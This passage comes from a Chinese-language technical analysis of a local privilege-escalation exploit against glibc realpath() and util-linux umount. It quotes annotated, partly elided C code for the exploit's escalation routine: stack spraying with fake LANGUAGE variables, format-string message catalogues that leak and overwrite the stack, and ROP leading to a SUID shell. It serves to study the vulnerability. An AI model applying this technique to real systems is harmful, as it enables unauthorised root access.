             0        999          1
    $ cat /proc/10173/gid_map 
             0        999          1
这样准备工作就做好了。进入第二部分 attemptEscalation() 函数：
    int attemptEscalation() {
      [...]
      pid_t childPid=fork();
      if(!childPid) {
        [...]
        result=chdir(targetCwd);    // 改变当前工作目录为 targetCwd
    // Create so many environment variables for a kind of "stack spraying".
        int envCount=UMOUNT_ENV_VAR_COUNT;
        char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));
        umountEnv[envCount--]=NULL;
        umountEnv[envCount--]="LC_ALL=C.UTF-8";
        while(envCount>=0) {
          umountEnv[envCount--]="AANGUAGE=X.X";        // 喷射栈的上部
        }
    // Invoke umount first by overwriting heap downwards using links
    // for "down", then retriggering another error message ("busy")
    // with hopefully similar same stack layout for other path "/".
        char* umountArgs[]={umountPathname, "/", "/", "/", "/", "/", "/", "/", "/", "/", "/", "down", "LABEL=78", "LABEL=789", "LABEL=789a", "LABEL=789ab", "LABEL=789abc", "LABEL=789abcd", "LABEL=789abcde", "LABEL=789abcdef", "LABEL=789abcdef0", "LABEL=789abcdef0", NULL};
        result=execve(umountArgs[0], umountArgs, umountEnv);
      }
      [...]
      int escalationPhase=0;
      [...]
      while(1) {
        if(escalationPhase==2) {    // 阶段 2 => case 3
          result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);
          [...]
          escalationPhase++;
        }
    // Wait at most 10 seconds for IO.
        result=poll(pollFdList, 1, 10000);
        [...]
    // Perform the IO operations without blocking.
        if(pollFdList[0].revents&(POLLIN|POLLHUP)) {
          result=read(
              pollFdList[0].fd, readBuffer+readDataLength,
              sizeof(readBuffer)-readDataLength);
          [...]
          readDataLength+=result;
    // Handle the data depending on escalation phase.
          int moveLength=0;
          switch(escalationPhase) {
            case 0: // Initial sync: read A*8 preamble.        // 阶段 0，读取我们精心构造的 util-linux.mo 文件中的格式化字符串。成功写入 8*'A' 的 preamble
              [...]
              char *preambleStart=memmem(readBuffer, readDataLength,
                  "AAAAAAAA", 8);    // 查找内存，设置 preambleStart
              [...]
    // We found, what we are looking for. Start reading the stack.
              escalationPhase++;    // 阶段加 1 => case 1
              moveLength=preambleStart-readBuffer+8;
            case 1: // Read the stack.        // 阶段 1，利用格式化字符串读出栈数据，计算出 libc 等有用的地址以对付 ASLR
    // Consume stack data until or local array is full.
              while(moveLength+16 case 2
              char *escalationString=(char*)malloc(1024);        // 将下一阶段的格式化字符串写入到另一个 util-linux.mo 中
              createStackWriteFormatString(
                  escalationString, 1024,
                  exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf
                  sourcePointerTarget, // Base value to write
                  exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...
                  libcStartFunctionReturnAddressSource,
                  (unsigned short*)stackWriteData,
                  sizeof(stackWriteData)/sizeof(unsigned short)
              );
              fprintf(stderr, "Using escalation string %s", escalationString);
              result=writeMessageCatalogue(
                  secondPhaseCataloguePathname,
                  (char*[]){
                      "%s: mountpoint not found",
                      "%s: not mounted",
                      "%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)"
                  },
                  (char*[]){
                      escalationString,
                      "BBBB5678%3$s\n",
                      "BBBBABCD%s\n"},
                  3);
              break;
            case 2:        // 阶段 2，修改了参数 “LANGUAGE”，从而触发了 util-linux.mo 的重新读入，然后将新的格式化字符串写入到另一个 util-linux.mo 中
            case 3:        // 阶段 3，读取 umount 的输出以避免阻塞进程，同时等待 ROP 执行 fchown/fchmod 修改权限和所有者，最后退出
    // Wait for pipe connection and output any result from mount.
              readDataLength=0;
              break;
              [...]
          }
          if(moveLength) {
            memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);
            readDataLength-=moveLength;
          }
        }
      }
    attemptEscalationCleanup:
      [...]
      return(escalationSuccess);
    }
通过栈喷射在内存中放置大量的 "AANGUAGE=X.X" 环境变量，这些变量位于栈的上部，包含了大量的指针。当运行 umount 时，很可能会调用到
realpath() 并造成下溢。umount 调用 setlocale 设置 locale，接着调用 realpath() 检查路径的过程如下：
    /*
     * Check path -- non-root user should not be able to resolve path which is
     * unreadable for him.
     */
    static char *sanitize_path(const char *path)
    {
        [...]
        p = canonicalize_path_restricted(path);    // 该函数会调用 realpath()，并返回绝对地址
        [...]
        return p;
    }
    int main(int argc, char **argv)
    {
        [...]
        setlocale(LC_ALL, "");    // 设置 locale，LC_ALL 变量的值会覆盖掉 LANG 和所有 LC_* 变量的值
        [...]
        if (all) {
            [...]
        } else if (argc 
    char *setlocale(int category, const char *locale);
    // util-linux/lib/canonicalize.c
    char *canonicalize_path_restricted(const char *path)
    {
        [...]
        canonical = realpath(path, NULL);
        [...]
        return canonical;
    }
因为所布置的环境变量是错误的（正确的应为 "LANGUAGE=X.X"），程序会打印出错误信息，此时第一阶段的 message catalogue
文件被加载，里面的格式化字符串将内存 dump 到 stderr，然后正如上面所讲的设置 restricted 字段，并将一个
L写到喷射栈中，将其中一个环境变量修改为正确的 "LANGUAGE=X.X"。
由于 LANGUAGE 发生了改变，umount 将尝试加载另一种语言的 catalogue。此时 umount 会有一个阻塞时间用于创建一个新的
message catalogue，漏洞利用得以同步进行，然后 umount 继续执行。
更新后的格式化字符串现在包含了当前程序的所有偏移。但是堆栈中却没有合适的指针用于写入，同时因为 fprintf
必须调用相同的格式化字符串，且每次调用需要覆盖不同的内存地址，这里采用一种简化的虚拟机的做法，将每次 fprintf
的调用作为时钟，路径名的长度作为指令指针。格式化字符串重复处理的过程将返回地址从主函数转移到了 getdate() 和 execl()
两个函数中，然后利用这两个函数做 ROP。
被调用的程序文件中包含一个 shebang（即"#!"），使系统调用了漏洞利用程序作为它的解释器。然后该漏洞利用程序修改了它的所有者和权限，使其变成一个
SUID 程序。当 umount 最初的调用者发现文件的权限发生了变化，它会做一些清理工作并调用 SUID 二进制文件的辅助功能，即一个 SUID
shell，完成提权。
#### 0x05 参考链接
  * 
  * 
  * 
  * man 3 getcwd，man 3 realpath，man mount_namespaces
* * *